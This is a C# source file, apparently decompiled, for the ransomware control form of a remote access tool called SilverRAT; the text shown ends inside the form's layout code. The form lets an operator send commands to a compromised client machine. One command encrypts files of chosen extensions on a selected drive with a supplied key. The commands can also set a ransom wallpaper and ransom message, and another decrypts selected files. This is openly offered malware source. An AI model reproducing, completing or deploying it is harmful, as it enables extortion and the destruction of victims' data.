using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Server.Helper;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using System;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Ransomware : Form
{
    public object syncPicbox = new object();

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    private Panel panelForm;

    private BunifuPages PageRNS;

    private TabPage PageSettings;

    private TabPage PageReadme;

    private TabPage PageEncrypt;

    internal AeroListView ListEncryptd;

    private ColumnHeader columnHeader1;

    private ColumnHeader columnHeader2;

    private ColumnHeader columnHeader3;

    private Panel PaneControll;

    private Guna2Button ButReadme;

    private Guna2Button ButSettings;

    private Guna2Button ButEncrypt;

    private BunifuPanel PanelTitle;

    private BunifuLabel TitlrPage;

    public BunifuLoader LoaderConnect;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private BunifuTextBox TxExtension;

    private ColumnHeader columnHeader5;

    public Bunifu.UI.WinForms.BunifuDropdown GetDriversComboBox;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    public ImageList imageList1;

    private RichTextBox RichTextBoxMesssage;

    private BunifuTextBox KeyEncrypt;

    private PictureBox ImageBackground;

    public BunifuLabel CountFile;

    internal Guna2HtmlLabel guna2HtmlLabel3;

    public BunifuLabel LogsPath;

    private BunifuTextBox BackgroundFilename;

    private BunifuCheckBox EnabledBackground;

    private Label label1;

    private BunifuTextBox FilenameMessage;

    private BunifuCheckBox EnabledMessage;

    private Label TxDelay;

    internal Guna2HtmlLabel guna2HtmlLabel4;

    private BunifuTextBox MaxSize;

    public Guna2DataGridView ListExtension;

    private DataGridViewTextBoxColumn Column5;

    public ProgressBar progressBar1;

    public Guna2HtmlLabel State;

    public System.Windows.Forms.Timer TimerCounFile;

    private ContextMenuStrip contextMenuStrip1;

    private ToolStripMenuItem RefrshList;

    private ToolStripMenuItem Decrypt;

    private ToolStripMenuItem Delete;

    internal Guna2HtmlLabel guna2HtmlLabel1;

    public Guna2GradientButton Encrypt;

    private ContextMenuStrip ContectExtesion;

    private ToolStripMenuItem DeleteExtension;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public bool Admin { get; set; }

    public Ransomware()
    {
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
    }

    private void Ransomware_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            userIDClient.Split('\\');
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            ListExtension.Rows.Add(".txt");
            ListExtension.Rows.Add(".pdf");
            ListExtension.Rows.Add(".doc");
            ListExtension.Rows.Add(".rtf");
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void Ransomware_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButSettings_Click(object sender, EventArgs e)
    {
        PageRNS.SelectedIndex = 0;
        TitlrPage.Text = "Settings";
    }

    private void ButReadme_Click(object sender, EventArgs e)
    {
        PageRNS.SelectedIndex = 1;
        TitlrPage.Text = "Message Box";
    }

    private void ButEncrypt_Click(object sender, EventArgs e)
    {
        PageRNS.SelectedIndex = 2;
        TitlrPage.Text = "Encrypted files";
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
            Close();
        }
    }

    private void Ransomware_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Encrypt_Click(object sender, EventArgs e)
    {
        try
        {
            ListEncryptd.Items.Clear();
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Encrypt";
            msgPack.ForcePathObject("Path").AsString = GetDriversComboBox.Text;
            msgPack.ForcePathObject("Extensions").AsString = GetExtension();
            msgPack.ForcePathObject("Size").AsInteger = Convert.ToInt32(MaxSize.Text) * 1000 * 1000;
            msgPack.ForcePathObject("Key").AsString = KeyEncrypt.Text;
            if (EnabledBackground.Checked && File.Exists(BackgroundFilename.Text))
            {
                msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(BackgroundFilename.Text));
                msgPack.ForcePathObject("EnabelImage").AsString = EnabledBackground.Checked.ToString();
            }
            msgPack.ForcePathObject("EnabelMessage").AsString = EnabledMessage.Checked.ToString();
            if (EnabledMessage.Checked)
            {
                msgPack.ForcePathObject("Message").AsString = RichTextBoxMesssage.Text;
            }
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            Encrypt.Text = "Encrypt";
            Encrypt.Enabled = false;
        }
        catch
        {
        }
    }

    private void EnabledBackground_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnabledBackground.Checked)
        {
            BackgroundFilename.Enabled = true;
        }
        else
        {
            BackgroundFilename.Enabled = false;
        }
    }

    private void EnabledMessage_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnabledMessage.Checked)
        {
            FilenameMessage.Enabled = true;
            RichTextBoxMesssage.Enabled = true;
        }
        else
        {
            FilenameMessage.Enabled = false;
            RichTextBoxMesssage.Enabled = false;
        }
    }

    private void BackgroundFilename_OnIconRightClick(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose jpg";
            openFileDialog.Filter = "Jpg |*.jpg";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                BackgroundFilename.Text = openFileDialog.FileName;
                ImageBackground.Image = Image.FromFile(openFileDialog.FileName);
            }
            else
            {
                ImageBackground.Image = null;
                BackgroundFilename.Text = "";
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void FilenameMessage_OnIconRightClick(object sender, EventArgs e)
    {
        try
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose txt";
            openFileDialog.Filter = "Txt |*.txt";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FilenameMessage.Text = openFileDialog.FileName;
                RichTextBoxMesssage.Text = File.ReadAllText(openFileDialog.FileName);
            }
            else
            {
                FilenameMessage.Text = openFileDialog.FileName;
                RichTextBoxMesssage.Text = File.ReadAllText(openFileDialog.FileName);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    private void MaxSize_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Back)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void MaxSize_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (!char.IsNumber(e.KeyChar) & !char.IsControl(e.KeyChar))
        {
            e.Handled = true;
        }
    }

    private void TimerCounFile_Tick(object sender, EventArgs e)
    {
        CountFile.Text = ListEncryptd.Items.Count.ToString();
    }

    private void TxExtension_OnIconRightClick(object sender, EventArgs e)
    {
        try
        {
            if (TxExtension.Text == null)
            {
                MessageBox.Show("Please enter Extension", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            if (!TxExtension.Text.Contains("."))
            {
                MessageBox.Show("Please enter Extension", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            if (TxExtension.Text.Contains(".Sarmat"))
            {
                MessageBox.Show("This extension is reserved and not allowed for use", "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
                return;
            }
            ListExtension.Rows.Add(TxExtension.Text);
            TxExtension.Clear();
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    public string GetExtension()
    {
        try
        {
            string text = string.Empty;
            foreach (DataGridViewRow item in (IEnumerable)ListExtension.Rows)
            {
                if (!item.IsNewRow)
                {
                    text = text + item.Cells[0].Value.ToString() + ",";
                }
            }
            return text;
        }
        catch
        {
            return ".pdf,.doc,.txt";
        }
    }

    private void RefrshList_Click(object sender, EventArgs e)
    {
        try
        {
            ListEncryptd.Items.Clear();
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Refresh";
            msgPack.ForcePathObject("Path").AsString = GetDriversComboBox.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void Decrypt_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListEncryptd.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selectedItem in ListEncryptd.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "DecryptFiles";
                msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            ListEncryptd.Items.Clear();
            MsgPack msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Packet").AsString = "Refresh";
            msgPack2.ForcePathObject("Path").AsString = GetDriversComboBox.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void DeleteExtension_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ListExtension.SelectedRows)
            {
                ListExtension.Rows.Remove(selectedRow);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Ransomware!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.Ransomware));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties9 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties10 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties11 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties12 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties13 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties14 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties15 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties16 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties17 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties18 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties19 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties20 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PageRNS = new Bunifu.UI.WinForms.BunifuPages();
        this.PageSettings = new System.Windows.Forms.TabPage();
        this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.State = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.ListExtension = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContectExtesion = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.DeleteExtension = new System.Windows.Forms.ToolStripMenuItem();
        this.guna2HtmlLabel4 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.MaxSize = new Bunifu.UI.WinForms.BunifuTextBox();
        this.CountFile = new Bunifu.UI.WinForms.BunifuLabel();
        this.progressBar1 = new System.Windows.Forms.ProgressBar();
        this.FilenameMessage = new Bunifu.UI.WinForms.BunifuTextBox();
        this.guna2HtmlLabel3 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.TxDelay = new System.Windows.Forms.Label();
        this.EnabledMessage = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.LogsPath = new Bunifu.UI.WinForms.BunifuLabel();
        this.BackgroundFilename = new Bunifu.UI.WinForms.BunifuTextBox();
        this.GetDriversComboBox = new Bunifu.UI.WinForms.BunifuDropdown();
        this.EnabledBackground = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label1 = new System.Windows.Forms.Label();
        this.KeyEncrypt = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ImageBackground = new System.Windows.Forms.PictureBox();
        this.TxExtension = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Encrypt = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PageReadme = new System.Windows.Forms.TabPage();
        this.RichTextBoxMesssage = new System.Windows.Forms.RichTextBox();
        this.PageEncrypt = new System.Windows.Forms.TabPage();
        this.ListEncryptd = new Server.Helper.AeroListView();
        this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader5 = new System.Windows.Forms.ColumnHeader();
        this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.RefrshList = new System.Windows.Forms.ToolStripMenuItem();
        this.Decrypt = new System.Windows.Forms.ToolStripMenuItem();
        this.Delete = new System.Windows.Forms.ToolStripMenuItem();
        this.imageList1 = new System.Windows.Forms.ImageList(this.components);
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButReadme = new Guna.UI2.WinForms.Guna2Button();
        this.ButSettings = new Guna.UI2.WinForms.Guna2Button();
        this.ButEncrypt = new Guna.UI2.WinForms.Guna2Button();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.TimerCounFile = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PageRNS.SuspendLayout();
        this.PageSettings.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListExtension).BeginInit();
        this.ContectExtesion.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageBackground).BeginInit();
        this.PageReadme.SuspendLayout();
        this.PageEncrypt.SuspendLayout();
        this.contextMenuStrip1.SuspendLayout();
        this.PaneControll.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PageRNS);
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(682, 604);
        this.panelForm.TabIndex = 574;
        this.panelForm.Visible = false;
        this.PageRNS.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageRNS.AllowTransitions = false;
        this.PageRNS.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PageRNS.Controls.Add(this.PageSettings);
        this.PageRNS.Controls.Add(this.PageReadme);
        this.PageRNS.Controls.Add(this.PageEncrypt);
        this.PageRNS.Location = new System.Drawing.Point(67, 112);
        this.PageRNS.Multiline = true;
        this.PageRNS.Name = "PageRNS";
        this.PageRNS.Page = this.PageSettings;
        this.PageRNS.PageIndex = 0;
        this.PageRNS.PageName = "PageSettings";
        this.PageRNS.PageTitle = "settings";
        this.PageRNS.SelectedIndex = 0;
        this.PageRNS.Size = new System.Drawing.Size(599, 446);
        this.PageRNS.TabIndex = 609;
        animation.AnimateOnlyDifferences = false;
        animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0f;
        animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new System.Windows.Forms.Padding(0);
        animation.RotateCoeff = 0f;
        animation.RotateLimit = 0f;
        animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0f;
        animation.TransparencyCoeff = 0f;
        this.PageRNS.Transition = animation;
        this.PageRNS.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PageSettings.Controls.Add(this.guna2HtmlLabel1);
        this.PageSettings.Controls.Add(this.State);
        this.PageSettings.Controls.Add(this.ListExtension);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel4);
        this.PageSettings.Controls.Add(this.MaxSize);
        this.PageSettings.Controls.Add(this.CountFile);
        this.PageSettings.Controls.Add(this.progressBar1);
        this.PageSettings.Controls.Add(this.FilenameMessage);
        this.PageSettings.Controls.Add(this.guna2HtmlLabel3);
        this.PageSettings.Controls.Add(this.TxDelay);
        this.PageSettings.Controls.Add(this.EnabledMessage);
        this.PageSettings.Controls.Add(this.LogsPath);
        this.PageSettings.Controls.Add(this.BackgroundFilename);
        this.PageSettings.Controls.Add(this.GetDriversComboBox);
        this.PageSettings.Controls.Add(this.EnabledBackground);
        this.PageSettings.Controls.Add(this.label1);
        this.PageSettings.Controls.Add(this.KeyEncrypt);
        this.PageSettings.Controls.Add(this.ImageBackground);
        this.PageSettings.Controls.Add(this.TxExtension);
        this.PageSettings.Controls.Add(this.Encrypt);
        this.PageSettings.Location = new System.Drawing.Point(4, 4);
        this.PageSettings.Name = "PageSettings";
        this.PageSettings.Size = new System.Drawing.Size(591, 420);
        this.PageSettings.TabIndex = 0;
        this.PageSettings.Text = "settings";
        this.PageSettings.UseVisualStyleBackColor = true;
        this.guna2HtmlLabel1.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel1.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel1.Location = new System.Drawing.Point(16, 20);
        this.guna2HtmlLabel1.Name = "guna2HtmlLabel1";
        this.guna2HtmlLabel1.Size = new System.Drawing.Size(93, 17);
        this.guna2HtmlLabel1.TabIndex = 698;
        this.guna2HtmlLabel1.Text = "Encrypting Path :";
        this.State.BackColor = System.Drawing.Color.White;
        this.State.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.State.ForeColor = System.Drawing.Color.Black;
        this.State.Location = new System.Drawing.Point(16, 330);
        this.State.Name = "State";
        this.State.Size = new System.Drawing.Size(74, 17);
        this.State.TabIndex = 686;
        this.State.Text = "Complete 0%";
        this.ListExtension.AllowUserToAddRows = false;
        this.ListExtension.AllowUserToDeleteRows = false;
        this.ListExtension.AllowUserToResizeColumns = false;
        this.ListExtension.AllowUserToResizeRows = false;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListExtension.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        this.ListExtension.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListExtension.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListExtension.BackgroundColor = System.Drawing.Color.White;
        this.ListExtension.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
        this.ListExtension.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListExtension.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListExtension.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListExtension.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListExtension.ColumnHeadersHeight = 30;
        this.ListExtension.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListExtension.Columns.AddRange(this.Column5);
        this.ListExtension.ContextMenuStrip = this.ContectExtesion;
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListExtension.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListExtension.EnableHeadersVisualStyles = false;
        this.ListExtension.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListExtension.Location = new System.Drawing.Point(16, 81);
        this.ListExtension.Name = "ListExtension";
        this.ListExtension.ReadOnly = true;
        this.ListExtension.RowHeadersVisible = false;
        this.ListExtension.RowHeadersWidth = 27;
        this.ListExtension.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListExtension.ShowCellErrors = false;
        this.ListExtension.ShowEditingIcon = false;
        this.ListExtension.ShowRowErrors = false;
        this.ListExtension.Size = new System.Drawing.Size(139, 176);
        this.ListExtension.TabIndex = 697;
        this.ListExtension.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListExtension.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListExtension.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListExtension.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListExtension.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListExtension.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListExtension.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListExtension.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListExtension.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListExtension.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListExtension.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListExtension.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListExtension.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListExtension.ThemeStyle.HeaderStyle.Height = 30;
        this.ListExtension.ThemeStyle.ReadOnly = true;
        this.ListExtension.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListExtension.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListExtension.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListExtension.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListExtension.ThemeStyle.RowsStyle.Height = 22;
